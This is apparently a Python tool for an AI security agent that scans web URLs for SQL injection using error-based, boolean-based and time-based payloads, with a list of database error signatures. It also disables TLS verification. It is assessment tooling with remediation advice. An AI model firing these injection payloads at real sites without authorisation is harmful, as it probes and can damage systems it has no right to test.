"""SQL injection probe for web application assessment.

Tests URL query parameters and POST body parameters for SQL injection
vulnerabilities using three complementary detection techniques:

  1. Error-based: inject SQL syntax that triggers a database error message.
     Checks response body for DBMS-specific error strings.

  2. Boolean-based: inject a true condition (e.g. ' OR '1'='1) vs a false
     condition (e.g. ' OR '1'='2). If the responses differ, injection is
     likely.

  3. Time-based blind: inject a conditional sleep (e.g. ' AND SLEEP(3)--).
     A response that takes ≥3x the baseline time indicates injection.

DBMS error signatures detected:
  MySQL    — "you have an error in your sql syntax", "mysql_fetch"
  MSSQL    — "unclosed quotation mark", "microsoft oledb", "sql server"
  Oracle   — "ora-0", "oracle error"
  SQLite   — "sqlite3.operationalerror", "sqlite error"
  Postgres — "postgresql error", "pg::syntaxerror", "unrecognized token"
  Generic  — "sql syntax", "syntax error near", "unexpected end of sql"

Severity:
  CRITICAL — error-based or boolean-based injection confirmed
  HIGH     — strong time-delay anomaly (≥5 × baseline)
  MEDIUM   — moderate time-delay anomaly (≥3 × baseline < 5 ×)
  INFO     — no anomaly detected

Stdlib-only: http.client + ssl + urllib + time. No external dependencies.
"""

from __future__ import annotations

import http.client
import ssl
import time
import urllib.parse
from typing import NamedTuple

from cai.sdk.agents import function_tool
from cai.tool_registry import TOOL_REGISTRY


# ---------------------------------------------------------------------------
# Error signatures
# ---------------------------------------------------------------------------

_ERROR_SIGS: list[tuple[str, str]] = [
    ("you have an error in your sql syntax",   "MySQL"),
    ("supplied argument is not a valid mysql",  "MySQL"),
    ("mysql_fetch_array()",                    "MySQL"),
    ("unclosed quotation mark after",          "MSSQL"),
    ("microsoft oledb provider for sql server","MSSQL"),
    ("incorrect syntax near",                  "MSSQL"),
    ("sql server native client",               "MSSQL"),
    ("ora-00907",                              "Oracle"),
    ("ora-01756",                              "Oracle"),
    ("oracle error",                           "Oracle"),
    ("sqlite3.operationalerror",               "SQLite"),
    ("sqlite error",                           "SQLite"),
    ("pg::syntaxerror",                        "PostgreSQL"),
    ("pgsql error",                            "PostgreSQL"),
    ("postgresql error",                       "PostgreSQL"),
    ("syntax error at or near",                "PostgreSQL"),
    ("sql syntax",                             "Generic"),
    ("syntax error near unexpected token",     "Generic"),
    ("unexpected end of sql command",          "Generic"),
]

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

# Error-based payloads — single quote, double quote, comment injection
_ERROR_PAYLOADS = ["'", '"', "' --", "' #", "' /*", "1' OR '1'='1", "1\" OR \"1\"=\"1"]

# Boolean-based pairs: (true_payload, false_payload)
_BOOL_PAIRS = [
    ("' OR '1'='1' --",  "' OR '1'='2' --"),
    ("' OR 1=1 --",      "' OR 1=2 --"),
    ("1 OR 1=1",         "1 OR 1=2"),
]

# Time-based payloads by technique
_TIME_PAYLOADS = [
    "' AND SLEEP(3) --",           # MySQL
    "'; WAITFOR DELAY '0:0:3' --", # MSSQL
    "' OR SLEEP(3) --",            # MySQL
    "1; SELECT pg_sleep(3) --",    # PostgreSQL
]

_SLEEP_SECONDS = 3.0


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

class SQLiFinding(NamedTuple):
    url: str
    param: str
    technique: str     # error | boolean | time
    severity: str      # CRITICAL | HIGH | MEDIUM | INFO
    status: str        # CONFIRMED | PROBABLE | POTENTIAL | SAFE
    detail: str


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

def _request(
    url: str, method: str = "GET", body: str = "", timeout: float = 8.0
) -> tuple[int, str, float]:
    """Send HTTP request. Returns (status, body_lower, elapsed_seconds). (-1,'',0) on failure."""
    try:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urllib.parse.urlparse(url)
        is_https = parsed.scheme == "https"
        host = parsed.netloc or parsed.path
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        conn_cls = http.client.HTTPSConnection if is_https else http.client.HTTPConnection
        conn = conn_cls(host, timeout=timeout, **({"context": ctx} if is_https else {}))

        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; sqli-checker/1.0)",
            "Accept": "*/*",
        }
        if body:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(len(body.encode("utf-8")))

        t0 = time.monotonic()
        conn.request(method, path, body=body.encode("utf-8") if body else None, headers=headers)
        resp = conn.getresponse()
        status = resp.status
        resp_body = resp.read(32768).decode("utf-8", errors="replace").lower()
        elapsed = time.monotonic() - t0
        conn.close()
        return status, resp_body, elapsed
    except Exception:
        return -1, "", 0.0


def _inject_param(base_url: str, param_name: str, param_value: str) -> str:
    """Return base_url with param_name replaced by param_value in the query string."""
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param_name] = [param_value]
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)))


# ---------------------------------------------------------------------------
# Detection helpers
# ---------------------------------------------------------------------------

def _check_error_based(
    url: str, param: str, baseline_body: str, timeout: float
) -> SQLiFinding | None:
    """Try error-based SQLi payloads on param. Returns a finding or None."""
    for payload in _ERROR_PAYLOADS:
        probe_url = _inject_param(url, param, payload)
        status, body, _ = _request(probe_url, timeout=timeout)
        if status == -1:
            continue
        for sig, dbms in _ERROR_SIGS:
            if sig in body and sig not in baseline_body:
                return SQLiFinding(
                    url=probe_url,
                    param=param,
                    technique="error",
                    severity="CRITICAL",
                    status="CONFIRMED",
                    detail=(
                        f"Error-based SQLi in '{param}': {dbms} error signature "
                        f"'{sig}' appeared in response when payload '{payload}' was injected."
                    ),
                )
    return None


def _check_boolean_based(
    url: str, param: str, baseline_body: str, baseline_status: int, timeout: float
) -> SQLiFinding | None:
    """Try boolean-based SQLi pairs on param. Returns a finding or None."""
    for true_payload, false_payload in _BOOL_PAIRS:
        _, true_body, _ = _request(_inject_param(url, param, true_payload), timeout=timeout)
        _, false_body, _ = _request(_inject_param(url, param, false_payload), timeout=timeout)

        if true_body == "" or false_body == "":
            continue

        # True condition should differ from false condition, both different from baseline
        # Use length as a proxy (within reason)
        true_len = len(true_body)
        false_len = len(false_body)
        baseline_len = len(baseline_body)

        diff = abs(true_len - false_len)
        if diff > 50 and diff > 0.2 * max(true_len, false_len, 1):
            # Also require that at least one of the responses differs from baseline
            true_diff = abs(true_len - baseline_len)
            false_diff = abs(false_len - baseline_len)
            if max(true_diff, false_diff) > 50:
                return SQLiFinding(
                    url=_inject_param(url, param, true_payload),
                    param=param,
                    technique="boolean",
                    severity="CRITICAL",
                    status="CONFIRMED",
                    detail=(
                        f"Boolean-based SQLi in '{param}': true-condition response "
                        f"({true_len} bytes) differs significantly from false-condition "
                        f"response ({false_len} bytes). Injection alters query logic."
                    ),
                )
    return None


def _check_time_based(
    url: str, param: str, baseline_elapsed: float, timeout: float
) -> SQLiFinding | None:
    """Try time-based SQLi payloads on param. Returns a finding or None."""
    # If baseline is already slow, skip (can't reliably distinguish)
    if baseline_elapsed > 1.5:
        return None

    for payload in _TIME_PAYLOADS:
        probe_url = _inject_param(url, param, payload)
        _, _, elapsed = _request(probe_url, timeout=timeout + _SLEEP_SECONDS + 2)

        ratio = elapsed / max(baseline_elapsed, 0.05)  # avoid divide-by-zero

        if elapsed >= _SLEEP_SECONDS * 0.9 and ratio >= 5:
            return SQLiFinding(
                url=probe_url,
                param=param,
                technique="time",
                severity="HIGH",
                status="PROBABLE",
                detail=(
                    f"Time-based blind SQLi in '{param}': response took {elapsed:.1f}s "
                    f"({ratio:.1f}× baseline) when payload '{payload}' was injected. "
                    f"Sleep of {_SLEEP_SECONDS}s likely triggered."
                ),
            )

        if elapsed >= _SLEEP_SECONDS * 0.7 and ratio >= 3:
            return SQLiFinding(
                url=probe_url,
                param=param,
                technique="time",
                severity="MEDIUM",
                status="POTENTIAL",
                detail=(
                    f"Possible time-based SQLi in '{param}': response took {elapsed:.1f}s "
                    f"({ratio:.1f}× baseline) when sleep payload injected. "
                    "Investigate further — could be server load."
                ),
            )
    return None


# ---------------------------------------------------------------------------
# Core check
# ---------------------------------------------------------------------------

def _check_sqli(url: str, timeout: float = 8.0) -> list[SQLiFinding]:
    """Probe url for SQL injection vulnerabilities. Returns all findings."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    # Baseline
    baseline_status, baseline_body, baseline_elapsed = _request(url, timeout=timeout)
    if baseline_status == -1:
        http_url = url.replace("https://", "http://", 1)
        baseline_status, baseline_body, baseline_elapsed = _request(http_url, timeout=timeout)
        if baseline_status != -1:
            url = http_url

    if baseline_status == -1:
        return [SQLiFinding(url, "", "", "INFO", "SAFE", "Could not connect to target")]

    # Extract parameters from query string
    parsed = urllib.parse.urlparse(url)
    params = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())

    if not params:
        return [SQLiFinding(
            url, "", "", "INFO", "SAFE",
            "No query parameters found in URL. Supply parameters via the URL "
            "(e.g. https://example.com/search?q=test)"
        )]

    findings: list[SQLiFinding] = []

    for param in params:
        if any(f.status == "CONFIRMED" and f.param == param for f in findings):
            continue

        # 1. Error-based
        finding = _check_error_based(url, param, baseline_body, timeout)
        if finding:
            findings.append(finding)
            continue

        # 2. Boolean-based
        finding = _check_boolean_based(url, param, baseline_body, baseline_status, timeout)
        if finding:
            findings.append(finding)
            continue

        # 3. Time-based
        finding = _check_time_based(url, param, baseline_elapsed, timeout)
        if finding:
            findings.append(finding)

    return findings


# ---------------------------------------------------------------------------
# Report formatter
# ---------------------------------------------------------------------------

def _run_sqli_probe(targets: str, timeout: float = 8.0) -> str:
    items = [t.strip() for t in targets.replace(",", "\n").splitlines() if t.strip()]
    if not items:
        return "[sqli_probe] Error: no URLs provided"

    lines: list[str] = [f"[sqli_probe] Probing {len(items)} target(s) for SQL injection\n"]
    total_confirmed = total_probable = total_potential = total_safe = 0

    for url in items:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        lines.append("─" * 60)
        lines.append(f"URL: {url}")
        lines.append("")

        findings = _check_sqli(url, timeout)

        confirmed = [f for f in findings if f.status == "CONFIRMED"]
        probable = [f for f in findings if f.status == "PROBABLE"]
        potential = [f for f in findings if f.status == "POTENTIAL"]

        if not findings or all(f.status == "SAFE" for f in findings):
            lines.append("  SAFE — No SQLi indicators found")
            total_safe += 1
        else:
            for f in (confirmed + probable + potential):
                icon = "!!!" if f.status == "CONFIRMED" else (" ! " if f.status == "PROBABLE" else " ~ ")
                lines.append(f"  [{icon}] {f.severity:<8}  {f.status}  [{f.technique}]")
                lines.append(f"           Param    : {f.param}")
                lines.append(f"           Detail   : {f.detail}")
                lines.append(f"           URL      : {f.url[:100]}")
                lines.append("")
            total_confirmed += len(confirmed)
            total_probable += len(probable)
            total_potential += len(potential)

        lines.append("")

    lines.append("─" * 60)
    lines.append(
        f"Summary: {total_confirmed} CONFIRMED, {total_probable} PROBABLE, "
        f"{total_potential} POTENTIAL, {total_safe} SAFE"
    )

    if total_confirmed or total_probable:
        lines.append(
            "\nNote: SQL injection can lead to data extraction, authentication bypass, "
            "file read/write, and in some configurations OS command execution. "
            "Use parameterised queries / prepared statements and an ORM. "
            "Never build SQL by concatenating user input."
        )

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Function tool
# ---------------------------------------------------------------------------

@function_tool
def sqli_probe(targets: str) -> str:
    """Probe web endpoints for SQL injection vulnerabilities.

    Tests query-string parameters using three techniques:
      1. Error-based: detects DBMS error strings (MySQL, MSSQL, Oracle,
         PostgreSQL, SQLite) when a single-quote or syntax-breaking payload
         is injected.
      2. Boolean-based: compares true/false condition responses; a significant
         length difference indicates the query logic was altered.
      3. Time-based blind: injects SLEEP/WAITFOR payloads and measures response
         time against the baseline.

    Verdicts:
      CONFIRMED — error-based or boolean-based injection detected
      PROBABLE  — strong time-delay anomaly (≥5× baseline, ≥3s sleep)
      POTENTIAL — moderate time-delay anomaly (≥3× baseline)

    Args:
        targets: Newline- or comma-separated list of target URLs.
                 URLs must include query parameters to test.
                 Examples:
                   "https://example.com/search?q=test&category=books"
                   "https://shop.corp.com/product?id=1"
                   "target.com/login?user=admin, https://other.org/news?id=5"

    Returns:
        Per-parameter verdict and details, with a remediation note for findings.
    """
    return _run_sqli_probe(targets)


TOOL_REGISTRY.register(
    "sqli_probe",
    sqli_probe,
    categories=["recon", "web", "exploitation"],
)
